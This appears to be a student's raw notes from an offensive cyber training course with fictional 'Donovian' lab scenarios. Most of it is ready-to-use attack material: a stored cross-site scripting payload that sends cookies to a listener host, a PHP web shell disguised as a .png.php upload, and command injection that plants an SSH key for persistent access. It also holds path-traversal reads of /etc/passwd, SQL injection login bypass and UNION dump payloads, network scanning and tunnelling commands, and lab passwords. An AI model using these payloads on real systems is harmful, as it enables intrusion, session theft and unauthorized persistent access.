ssh demo1@10.50.12.21 -L1111:10.208.50.61:80
Stack Number	Username	Password	jump
15 	MAWI-M-503 	EkXBJpSgYSJm 	10.50.16.1

for i in {1..255}; do (ping -c 1 10.50.12.$i | grep 'bytes from' &); done
nmap -p 53 --script dns* 10.50.12.22-24
nmap -p 80 --script http-enum 10.50.12.22-24


for i in {96..128}; do proxychains nc -nvzw1 12.168.NetID.$i 22 53 80 135 137 139 445 2>&1 | grep OK | grep -Eo "192.168.NetID.:[0-9]" ; done

ssh -MS /tmp/jump demo1@10.50.12.21
ssh -S /tmp/jump jump -O forward -D 9050
ssh -S /tmp/jump jump -O forward -L1111:10.50.12.21:22 -L1112:20.50.12.21:80
ssh -S /tmp/jump jump -O cancel -L1111:10.50.12.21:22 -L1112:20.50.12.21:80


### stealthy multiplexer
ssh -MS /tmp/jump -fN agent@10.50.16.1 # this will create a backgrounded master shell

ssh -S /tmp/jump session1 # this is calling the socket
ssh -S /tmp/jump session2 # this is calling the socket
###


###demo1 - experienced an issue with /tmp/ .. use a perm dir.
create master socket
ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
ssh -S /tmp/demo demo1@10.50.12.21


host enumeration, ping sweep (from remote box)
for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done

64 bytes from 10.208.50.1: icmp_seq=1 ttl=64 time=0.147 ms
64 bytes from 10.208.50.42: icmp_seq=1 ttl=64 time=0.424 ms # target
64 bytes from 10.208.50.61: icmp_seq=1 ttl=64 time=0.404 ms
64 bytes from 10.208.50.200: icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from 10.208.50.230: icmp_seq=1 ttl=128 time=0.498 ms

#port enumeration with dynamic and proxychains
ssh -S /tmp/demo demo -O forward -D 9050 # on lin-ops

port 22/80

#build tunnel to it //
ssh -S /tmp/demo demo -O forward -L 42070:10.200.50.42:80 

#go to browser , localhost:42070

http enumeration
proxychains nmap --script=http-enum 10.200.50.42 80
 // copy output here && check /robots.txt

when you you go to the /paths/ for example open the terminal .. go to network
when a prompt shows up to upload a file.. you can do like ../../../../../etc/passwd | ../../../../../etc/hosts

#cmd inject uses semi-colin to run commands (not an active shell, cant cd)
; whoami

#javascript
open inspector
find js by looking for functions (
open console in inspector and run js manually, for example: changetext() / in console

# steal cookies
/chat
we will store our stored process scripting
setup nc listener: nc -lk <your ip from lin-ops (ifconfig)> 42071 # where you want to inercept cookie
# post to chat...
<script>document.location="http://10.50.187.57:52071/username=" + document.cookie;</script>


# malicious upload requeires 1. upload 2. find uploads 3. call upload

  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
- put in a .png.php



# ssh key gen ( very important )
cat /etc/passwd .. look for /bash

-- generate our key # run all on lin-ops
ssh-keygen -t rsa -b 4096 # enter for default option
No Passphrase

cat /home/student/.ssh/id_rsa.pub


# from remote machine / target - command injection
# make dir and verify
; mkdir /var/www/.ssh
; ls -la /var/www

#upload key and verify - still on target
; echo "" > /var/www/.ssh/authirized_keys #paste whole key into echo "<key>"
; cat /var/www/.ssh/authorized_keys


now 
ssh -S /tmp/demo demo -O cancel -L42071:10.208.50.42:80

ssh -S /tmp/demo demo -O forward -L42071:10.208.50.42:22
ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -FN 2>/dev/null
# specify key using -i
ssh -MS /tmp/t1 -i <key> www-data@127.00.1 -p 52071 -fN 2>/dev/null
ssh -S /tmp/t1 t1 www-data@127.0.0.1

to verify port works: nc 127.0.0.1 42071



``` 
**how to connect to web exploitation**
10.100.28.40
80 // 4444
/home/student/.ssh/id_rsa.pub


ssh -MS /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp jmp -O forward -L 50000:10.100.28.40:80
ssh -S /tmp/jmp jmp -O forward -L 51000:10.100.28.40:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000

ssh -MS /tmp/jmp student@pivot
ssh -S /tmp/jmp student@pivot
ssh -S /tmp/jmp jmp -O forward -L 50000:target:80
ssh -S /tmp/jmp jmp -O forward -L 51000:target:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000
```



SQL INJECTION


POST METHOD (input box)
how to check for vulnverable input field:
Audi 'OR 1='1

find number of colums were working with
Audi 'Union select 1,2,3,4,5 #

Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables

golden rule
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #

molding the statement to get the information we want example
Audi' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #






GET METHOD (URL MANIPULATION)

<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables   <!—Displays all table names in the database -->
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables   <!—Displays all databases and the names of their tables --> 
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns   <!—Display all tables and the columns they contain -->
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #   <!-- "Golden" statement -->
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car   <!-- Using information pulled from the Golden Statement to query a different table -->





UNION SELECT table_schema,permission_level,null FROM users WHERE permission_level='banned' #





10.100.28.40
80 // 4444
/home/student/.ssh/id_rsa.pub


EkXBJpSgYSJm

how to connect to web exploitation
ssh -MS /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp jmp -O forward -L 50000:10.100.28.40:80
ssh -S /tmp/jmp jmp -O forward -L 51000:10.100.28.40:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000

ssh -MS /tmp/jmp student@pivot
ssh -S /tmp/jmp student@pivot
ssh -S /tmp/jmp jmp -O forward -L 50000:target:80
ssh -S /tmp/jmp jmp -O forward -L 51000:target:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000


how to check for vulnverable input field:
Audi 'OR 1='1
Audi 'Union select 1,2,3,4,5 #






day 4 stuff
Donovian Database Exploitation (DWDBE)
XX Dec 2026
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.

Tools/Techniques:
All connections will be established through web browser to donovian-nla.
SSH masquerade to Donovian_Webserver with provide credentials.
Ports in use will be dependent on target location and are subject to change.
Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.


Prior Approvals:
SQLi injects through web browser.
Creation of database administrator account if directed to.
Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.

Scheme of Maneuver:
>Jump Box
->T1:10.100.28.48

Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.





check: ram' or 1='1
3 columns are required to make a UNION SELECT on the categories page

UNION SELECT 1,2,3 #


UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
UNION SELECT name,description,level FROM sqlinjection.permissions; #

UNION SELECT name,description,level FROM sqlinjection.permissions; #

login bypass:
' OR 1=1 OR ''='




admin password
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; # UNION SELECT name,description,level FROM sqlinjection.permissions; #

within the search POST
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; # UNION SELECT name,description,level FROM sqlinjection.permissions; #






Determine Vulnerable Code
What are functions?

How can a function be vulnerable?

C Code Example:

gets() -> fgets()
strcpy() -> strncpy()
strcat() -> strncat()
sprintf() -> snprintf()






A `stack canary` (or stack cookie) is a random, hidden value placed on the program stack during function execution, located just before the return pointer. It acts as a tripwire to detect stack buffer overflows; if the value changes (overwritten), the program crashes to prevent exploitation. 
































Data to Collect
Web Data

Sensitive Data

Publicly Accessible

Social Media

Domain and IP Data

Data to Collect
Web Data

Cached Content, Analytics, Proxy Web Application, Command Line Interrogation

Sensitive Data

Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings

Publicly Accessible

Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data

Social Media

Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists

Domain and IP Data

DNS Registration, IP Address Assignments, Geolocation Data, Whois

Hyper-Text Markup Language (HTML)
Standardized markup language for browser interpretation of webpages



Client-side interpretation (web browser)

Utilizes elements (identified by tags)

Typically redirects to another page for server-side interaction

Cascading Stylesheets (CSS) for page theming











# Run specific script or category
nmap --script <filename>|<category>|<directory>

# Get help for specific scripts
nmap --script-help "ftp-* and discovery"

# Pass arguments to scripts
nmap --script-args <args>
nmap --script-args-file <filename>

# Get help for scripts
nmap --script-help <filename>|<category>|<directory>

# Enable script tracing for debugging
nmap --script-trace









SITREP:Your team has been deployed for Operation Golden Nugget, in direct support of Gorgas forces amid the Donovian-Gorgas war. You have been tasked to collect, analyze, and process data utilizing various reconnaissance techniques throughout Donovian and Gorgas Cyberspace.

Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes upon request.

Intelligence believes that not all of the 192.168.28.96/27 network has the ability to communicate with the 192.168.150.224/27 network.

Donovian Reconnaissance and Scanning (DR&S)
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective:Scan target networks to gather pertinent host information.

Tools/Techniques: All connections will be established through network scans or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/techniques are limited to NSE scripts, python lxml and OSINT.

Scenario Credentials: FLAG = R3C0N5t@rt0F@ct1v1ty

Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing, passwords, services, destroy data, upload of tools, create accounts

Scheme of Maneuver:
>Jump Box
->Network scan: 192.168.28.96/27
-->Network scan:192.168.150.224/27

Target Section:

Network scans:
Network: 192.168.28.96/27
Network:192.168.150.224/27
OSs: unknown
Creds: student ::
Known Ports: unknown
Known URL: consulting.site.donovia
Known URL: conference.site.donovia
Action: Reconnaissance to collect intelligence and identify possible avenues of approach in the network.
